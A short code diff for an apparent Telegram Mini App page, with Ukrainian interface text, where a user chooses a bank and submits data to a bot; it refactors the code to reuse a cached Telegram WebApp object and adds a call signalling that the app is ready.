@@ -102,6 +102,7 @@
 
     let selectedBank = null;
     let userId = new URLSearchParams(window.location.search).get('user_id') || 'unknown';
+    let tg = window.Telegram ? window.Telegram.WebApp : null;
 
     function renderBanks() {
         const container = document.getElementById('bankList');
@@ -190,9 +191,9 @@
         statusEl.style.display = 'block';
         statusEl.textContent = '⏳ Надсилання даних...';
 
-        if (window.Telegram && window.Telegram.WebApp) {
+        if (tg) {
             try {
-                window.Telegram.WebApp.sendData(JSON.stringify(data));
+                tg.sendData(JSON.stringify(data));
                 statusEl.className = 'success';
                 statusEl.textContent = '✅ Дані успішно надіслано! Очікуйте підтвердження.';
                 document.getElementById('dot2').classList.remove('active');
@@ -203,7 +204,7 @@
                     statusEl.style.display = 'none';
                     document.getElementById('dot3').classList.remove('active');
                 }, 3000);
-                window.Telegram.WebApp.close();
+                tg.close();
             } catch(e) {
                 statusEl.className = 'error';
                 statusEl.textContent = '❌ Помилка відправки: ' + e.message;
@@ -212,6 +213,11 @@
             statusEl.className = 'error';
             statusEl.textContent = '❌ Telegram WebApp не доступний. Спробуйте через бота.';
         }
+    }
+
+    // Проверка, что WebApp загружен
+    if (tg) {
+        tg.ready();
     }
 
     renderBanks();
